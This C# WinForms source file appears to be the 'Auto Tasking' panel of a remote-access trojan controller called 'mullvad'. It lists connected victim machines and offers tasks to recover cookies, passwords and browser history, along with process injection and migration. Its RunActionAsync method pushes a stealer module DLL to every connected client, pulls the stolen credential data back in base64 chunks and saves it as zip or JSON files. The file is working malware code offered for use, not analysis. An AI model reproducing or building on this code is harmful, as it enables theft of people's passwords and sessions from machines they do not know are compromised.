using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using mullvad.Modules;
using mullvad.Network;
using mullvad.Theme;

namespace mullvad.Forms
{
    internal sealed class AutoTasksPanel : Form
    {
        private readonly Dictionary<string, ClientHandler> _handlers;

        // ── Controls ──────────────────────────────────────────────────────────
        private ToolStrip           _toolbar     = null!;
        private ToolStripButton     _btnAdd      = null!;
        private ToolStripButton     _btnRemove   = null!;
        private ToolStripButton     _btnRunNow   = null!;
        private ListView            _lvTasks     = null!;
        private ListView            _lvClients   = null!;
        private ContextMenuStrip    _taskMenu    = null!;

        public AutoTasksPanel(Dictionary<string, ClientHandler> handlers)
        {
            _handlers = handlers;
            Build();
        }

        private void Build()
        {
            SuspendLayout();

            Text      = "Auto Tasking";
            BackColor = ThemeManager.ControlColor;
            ForeColor = ThemeManager.ForeColor;

            // ── ToolStrip ─────────────────────────────────────────────────────
            _toolbar = new ToolStrip { GripStyle = ToolStripGripStyle.Hidden, Dock = DockStyle.Top };

            _btnAdd    = new ToolStripButton("Add Task")    { DisplayStyle = ToolStripItemDisplayStyle.Text };
            _btnRemove = new ToolStripButton("Remove Task") { DisplayStyle = ToolStripItemDisplayStyle.Text };
            _btnRunNow = new ToolStripButton("Run Now")     { DisplayStyle = ToolStripItemDisplayStyle.Text };

            _toolbar.Items.AddRange(new ToolStripItem[]
            {
                _btnAdd, _btnRemove, new ToolStripSeparator(), _btnRunNow
            });

            _btnAdd.Click    += BtnAdd_Click;
            _btnRemove.Click += BtnRemove_Click;
            _btnRunNow.Click += BtnRunNow_Click;

            // ── Context menus ─────────────────────────────────────────────────
            BuildTaskContextMenu();

            // ── Split panel ───────────────────────────────────────────────────
            var split = new SplitContainer
            {
                Dock        = DockStyle.Fill,
                Orientation = Orientation.Horizontal,
                SplitterDistance = 180,
            };

            // ── Top: Task list ────────────────────────────────────────────────
            _lvTasks = new ListView
            {
                Dock          = DockStyle.Fill,
                View          = View.Details,
                FullRowSelect = true,
                GridLines     = false,
                MultiSelect   = false,
                Font          = new Font("Segoe UI", 9F),
                ContextMenuStrip = _taskMenu,
            };
            _lvTasks.Columns.Add("Task Name",  200);
            _lvTasks.Columns.Add("Action",     200);
            _lvTasks.Columns.Add("Status",      90);
            _lvTasks.Columns.Add("Last Run",   130);
            _lvTasks.Columns.Add("Run Count",   80);
            _lvTasks.OwnerDraw = true;
            _lvTasks.DrawColumnHeader += (s, e) => e.DrawDefault = true;
            _lvTasks.DrawItem         += (s, e) => e.DrawDefault = false;
            _lvTasks.DrawSubItem      += DrawSubItem;

            var lblTasks = new Label
            {
                Text      = "Auto Tasks",
                Dock      = DockStyle.Top,
                Height    = 22,
                TextAlign = ContentAlignment.MiddleLeft,
                Padding   = new Padding(6, 0, 0, 0),
                Font      = new Font("Segoe UI", 9F, FontStyle.Bold),
            };

            var topPanel = new Panel { Dock = DockStyle.Fill };
            topPanel.Controls.Add(_lvTasks);
            topPanel.Controls.Add(lblTasks);
            split.Panel1.Controls.Add(topPanel);

            // ── Bottom: Client list ───────────────────────────────────────────
            _lvClients = new ListView
            {
                Dock          = DockStyle.Fill,
                View          = View.Details,
                FullRowSelect = true,
                GridLines     = false,
                Font          = new Font("Segoe UI", 9F),
            };
            _lvClients.Columns.Add("Computer",  200);
            _lvClients.Columns.Add("Username",  140);
            _lvClients.Columns.Add("OS",        160);
            _lvClients.Columns.Add("IP",        120);
            _lvClients.Columns.Add("Last Exec", 130);
            _lvClients.OwnerDraw = true;
            _lvClients.DrawColumnHeader += (s, e) => e.DrawDefault = true;
            _lvClients.DrawItem         += (s, e) => e.DrawDefault = false;
            _lvClients.DrawSubItem      += DrawSubItem;

            var lblClients = new Label
            {
                Text      = "Connected Clients",
                Dock      = DockStyle.Top,
                Height    = 22,
                TextAlign = ContentAlignment.MiddleLeft,
                Padding   = new Padding(6, 0, 0, 0),
                Font      = new Font("Segoe UI", 9F, FontStyle.Bold),
            };

            var botPanel = new Panel { Dock = DockStyle.Fill };
            botPanel.Controls.Add(_lvClients);
            botPanel.Controls.Add(lblClients);
            split.Panel2.Controls.Add(botPanel);

            Controls.Add(split);
            Controls.Add(_toolbar);

            Load += (_, _) => RefreshClientList();

            ResumeLayout(false);
        }

        private void BuildTaskContextMenu()
        {
            _taskMenu = new ContextMenuStrip();

            // Credentials submenu
            var menuCreds = new ToolStripMenuItem("Credentials");
            IconLoader.SetIcon(menuCreds, "cookierecovery.png");
            var miCookies   = MakeAction("Recover Cookies",   "creds.cookies",   false); IconLoader.SetIcon(miCookies,   "cookierecovery.png");
            var miHistory   = MakeAction("Recover History",   "creds.history",   false); IconLoader.SetIcon(miHistory,   "page_copy.png");
            var miPasswords = MakeAction("Recover Passwords", "creds.passwords", false); IconLoader.SetIcon(miPasswords, "key_go.png");
            var miFullRec   = MakeAction("Run Full Recovery", "creds.full",      false); IconLoader.SetIcon(miFullRec,   "done.png");
            menuCreds.DropDownItems.AddRange(new ToolStripItem[] { miCookies, miHistory, miPasswords, miFullRec });

            // Post Modules submenu
            var menuPost = new ToolStripMenuItem("Post Modules");
            IconLoader.SetIcon(menuPost, "application.png");
            var miMigration = MakeAction("Process Migration",  "post.migration", true);  IconLoader.SetIcon(miMigration, "application_cascade.png");
            miMigration.Click -= TaskMenuItem_Click;
            miMigration.Click += (s, ev) =>
            {
                var owner = FindForm() ?? Application.OpenForms.Cast<Form>().FirstOrDefault();
                string? json = MigrateProcessForm.GetParamsDialog(owner!);
                if (json != null) AddTask("Process Migration", "post.migration:" + json);
            };
            var miInjection = MakeAction("Process Injection",  "post.injection", false); IconLoader.SetIcon(miInjection, "application_go.png");
            var miBrowser   = MakeAction("Browser Inspection", "post.browser",   false); IconLoader.SetIcon(miBrowser,   "website.png");
            menuPost.DropDownItems.AddRange(new ToolStripItem[] { miMigration, miInjection, miBrowser });

            // Firewall
            var menuFirewall = MakeAction("Firewall Rules", "firewall", false);
            IconLoader.SetIcon(menuFirewall, "server.png");

            // Information
            var menuInfo = new ToolStripMenuItem("Information");
            IconLoader.SetIcon(menuInfo, "information.png");
            var miInfoSave = MakeAction("Save All to Database", "info.saveall", true);
            IconLoader.SetIcon(miInfoSave, "save.png");
            menuInfo.DropDownItems.Add(miInfoSave);

            // Network
            var menuNet = new ToolStripMenuItem("Network");
            IconLoader.SetIcon(menuNet, "world_link.png");
            var miNetSave = MakeAction("Save All to Database", "net.saveall", true);
            IconLoader.SetIcon(miNetSave, "save.png");
            menuNet.DropDownItems.Add(miNetSave);

            _taskMenu.Items.AddRange(new ToolStripItem[]
            {
                menuCreds,
                menuPost,
                menuFirewall,
                new ToolStripSeparator(),
                menuInfo,
                menuNet,
            });

            foreach (ToolStripItem item in _taskMenu.Items)
                if (item is ToolStripMenuItem mi)
                    mi.Click += TaskMenuItem_Click;
        }

        private static ToolStripMenuItem MakeAction(string text, string tag, bool enabled)
            => new ToolStripMenuItem(text) { Tag = tag, Enabled = enabled };

        private void TaskMenuItem_Click(object? sender, EventArgs e)
        {
            if (sender is ToolStripMenuItem mi && mi.Tag is string action && action != "add")
                AddTask(mi.Text, action);
        }

        private void AddTask(string name, string action)
        {
            var item = new ListViewItem(name);
            item.SubItems.Add(action);
            item.SubItems.Add("Active");
            item.SubItems.Add("—");
            item.SubItems.Add("0");
            item.Tag = action;
            _lvTasks.Items.Add(item);
        }

        private void BtnAdd_Click(object? sender, EventArgs e)
        {
            // Show a simple dialog to pick an action name
            using var dlg = new Form
            {
                Text            = "Add Auto Task",
                ClientSize      = new Size(320, 120),
                FormBorderStyle = FormBorderStyle.FixedDialog,
                MaximizeBox     = false, MinimizeBox = false,
                StartPosition   = FormStartPosition.CenterParent,
            };
            var lbl = new Label { Text = "Task name:", Left = 12, Top = 16, AutoSize = true };
            var txt = new TextBox { Left = 12, Top = 36, Width = 292, PlaceholderText = "e.g. Save Info on Connect" };
            var btn = new Button { Text = "Add", Left = 224, Top = 76, Width = 80, Height = 28, FlatStyle = FlatStyle.Flat, DialogResult = DialogResult.OK };
            dlg.Controls.AddRange(new Control[] { lbl, txt, btn });
            dlg.AcceptButton = btn;
            ThemeManager.ApplyForm(dlg);
            if (dlg.ShowDialog(this) == DialogResult.OK && !string.IsNullOrWhiteSpace(txt.Text))
                AddTask(txt.Text.Trim(), "custom");
        }

        private void BtnRemove_Click(object? sender, EventArgs e)
        {
            if (_lvTasks.SelectedItems.Count > 0)
                _lvTasks.SelectedItems[0].Remove();
        }

        private void BtnRunNow_Click(object? sender, EventArgs e)
        {
            if (_lvTasks.SelectedItems.Count == 0) return;
            var item = _lvTasks.SelectedItems[0];
            item.SubItems[3].Text = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
            int count = int.TryParse(item.SubItems[4].Text, out int c) ? c + 1 : 1;
            item.SubItems[4].Text = count.ToString();

            var action = item.Tag as string ?? "";
            foreach (var kv in _handlers)
                _ = RunActionAsync(kv.Value, action, item);
        }

        private async Task RunActionAsync(ClientHandler handler, string action, ListViewItem taskItem)
        {
            SetTaskStatus(taskItem, "Running…");
            try
            {
                byte[] dllBytes = ModuleLoader.GetModuleBytes("mullvad.Module.Intellix");
                if (dllBytes == null) { SetTaskStatus(taskItem, "Error: module not found"); return; }

                bool ok = await ModuleDelivery.EnsureDeliveredAsync(handler, "mullvad.Module.Intellix", dllBytes);
                if (!ok) { SetTaskStatus(taskItem, "Error: delivery failed"); return; }

                using var ctx = new ModuleContext(handler, "mullvad.intellix");

                if (action == "creds.full")
                {
                    string collectJson = await ctx.ExecuteAsync("collect", "", default, TimeSpan.FromMinutes(9));
                    int totalChunks = ParseInt(collectJson, "total_chunks");
                    int entries     = ParseInt(collectJson, "entries");
                    if (totalChunks <= 0) { SetTaskStatus(taskItem, "Error: collect failed"); return; }

                    using var ms = new MemoryStream();
                    for (int i = 0; i < totalChunks; i++)
                    {
                        string chunkJson = await ctx.ExecuteAsync("chunk", i.ToString(), default, TimeSpan.FromSeconds(60));
                        string data = ParseStr(chunkJson, "data");
                        if (data == null) { SetTaskStatus(taskItem, $"Error: chunk {i} failed"); return; }
                        byte[] bytes = Convert.FromBase64String(data);
                        ms.Write(bytes, 0, bytes.Length);
                    }

                    string dir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "mullvad", "Intellix");
                    Directory.CreateDirectory(dir);
                    string zipPath = Path.Combine(dir, handler.Info.Computer + "_" + DateTime.Now.ToString("yyyyMMdd_HHmmss") + ".zip");
                    File.WriteAllBytes(zipPath, ms.ToArray());
                    SetTaskStatus(taskItem, $"Done — {entries} entries → {Path.GetFileName(zipPath)}");
                }
                else
                {
                    string moduleAction = action switch
                    {
                        "creds.passwords" => "passwords",
                        "creds.cookies"   => "cookies",
                        "creds.history"   => "history",
                        _                 => null,
                    };
                    if (moduleAction == null) { SetTaskStatus(taskItem, $"Unknown action: {action}"); return; }

                    string result = await ctx.ExecuteAsync(moduleAction, "", default, TimeSpan.FromSeconds(90));
                    int count = CountJsonObjects(result);

                    string dir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "mullvad", "Recovery");
                    Directory.CreateDirectory(dir);
                    string filePath = Path.Combine(dir,
                        handler.Info.Computer + "_" + moduleAction + "_" + DateTime.Now.ToString("yyyyMMdd_HHmmss") + ".json");
                    File.WriteAllText(filePath, result, Encoding.UTF8);
                    SetTaskStatus(taskItem, $"Done — {count} records → {Path.GetFileName(filePath)}");
                }
            }
            catch (Exception ex)
            {
                SetTaskStatus(taskItem, "Error: " + ex.Message);
            }
        }

        private void SetTaskStatus(ListViewItem item, string status)
        {
            if (IsDisposed) return;
            if (InvokeRequired) { BeginInvoke(new Action(() => SetTaskStatus(item, status))); return; }
            item.SubItems[2].Text = status;
        }

        private static int ParseInt(string json, string field)
        {
            if (json == null) return 0;
            string marker = "\"" + field + "\":";
            int idx = json.IndexOf(marker); if (idx < 0) return 0;
            idx += marker.Length;
            int end = idx; while (end < json.Length && (char.IsDigit(json[end]) || json[end] == '-')) end++;
            return int.TryParse(json.Substring(idx, end - idx), out int v) ? v : 0;
        }

        private static string ParseStr(string json, string field)
        {
            if (json == null) return null;
            string marker = "\"" + field + "\":\"";
            int idx = json.IndexOf(marker); if (idx < 0) return null;
            idx += marker.Length;
            var sb = new StringBuilder(); bool esc = false;
            for (int i = idx; i < json.Length; i++)
            {
                char c = json[i];
                if (esc) { sb.Append(c); esc = false; }
                else if (c == '\\') esc = true;
                else if (c == '"') break;
                else sb.Append(c);
            }
            return sb.ToString();
        }

        private static int CountJsonObjects(string json)
        {
            if (string.IsNullOrEmpty(json)) return 0;
            int count = 0, depth = 0; bool inStr = false, esc = false;
            foreach (char c in json)
            {
                if (esc) { esc = false; continue; }
                if (c == '\\' && inStr) { esc = true; continue; }
                if (c == '"') { inStr = !inStr; continue; }
                if (inStr) continue;
                if (c == '{' && ++depth == 1) count++;
                else if (c == '}') depth--;
            }
            return count;
        }

        public void RefreshClientList()
        {
            _lvClients.Items.Clear();
            foreach (var kv in _handlers)
            {
                var info = kv.Value.Info;
                var item = new ListViewItem(info.Computer);
                item.SubItems.Add(info.Username);
                item.SubItems.Add(info.Os);
                item.SubItems.Add(info.IpAddress);
                item.SubItems.Add("—");
                item.Tag = kv.Key;
                _lvClients.Items.Add(item);
            }
        }

        private static void DrawSubItem(object? sender, DrawListViewSubItemEventArgs e)
        {
            var lv = (ListView)sender!;
            bool selected = e.Item!.Selected && lv.Focused;
            var bg = selected ? SystemColors.Highlight : lv.BackColor;
            var fg = selected ? SystemColors.HighlightText : lv.ForeColor;
            using var bgBrush = new SolidBrush(bg);
            e.Graphics.FillRectangle(bgBrush, e.Bounds);
            var tf = new StringFormat { LineAlignment = StringAlignment.Center, Trimming = StringTrimming.EllipsisCharacter };
            using var fgBrush = new SolidBrush(fg);
            var rect = e.Bounds;
            rect.X += 4;
            e.Graphics.DrawString(e.SubItem!.Text, lv.Font, fgBrush, rect, tf);
        }
    }
}
